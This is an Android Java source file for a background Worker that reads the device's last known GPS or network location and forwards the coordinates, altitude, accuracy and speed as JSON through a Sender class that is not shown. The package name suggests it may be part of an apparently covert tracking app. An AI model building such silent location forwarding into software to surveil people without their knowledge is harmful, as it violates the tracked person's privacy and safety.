package com.behavioralanalysis.service;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import org.json.JSONException;
import org.json.JSONObject;

public class Locations extends Worker {
    private final Context context;
    public static final String TAG = "location";

    protected LocationManager locationManager;

    public Locations(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        this.context = context;
    }

    @NonNull
    @Override
    public Result doWork() {
        try {
            android.location.Location location = null;
            locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            boolean isGPSEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
            boolean isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);

            if (locationManager != null && (isGPSEnabled || isNetworkEnabled)) {
                if (context.getPackageManager().checkPermission(Manifest.permission.ACCESS_FINE_LOCATION, context.getPackageName()) == PackageManager.PERMISSION_GRANTED &&
                        context.getPackageManager().checkPermission(Manifest.permission.ACCESS_COARSE_LOCATION, context.getPackageName()) == PackageManager.PERMISSION_GRANTED) {

                    if (isGPSEnabled) {
                        location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    }

                    if (location == null && isNetworkEnabled) {
                        location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    }
                }
            }

            if (location != null) {
                JSONObject object = new JSONObject();
                object.put("enabled", true);
                object.put("latitude", location.getLatitude());
                object.put("longitude", location.getLongitude());
                object.put("altitude", location.getAltitude());
                object.put("accuracy", location.getAccuracy());
                object.put("speed", location.getSpeed());
                Sender.send(TAG, object.toString());
            }
            return Result.success();
        } catch (Exception e) {
            return Result.failure();
        }
    }
}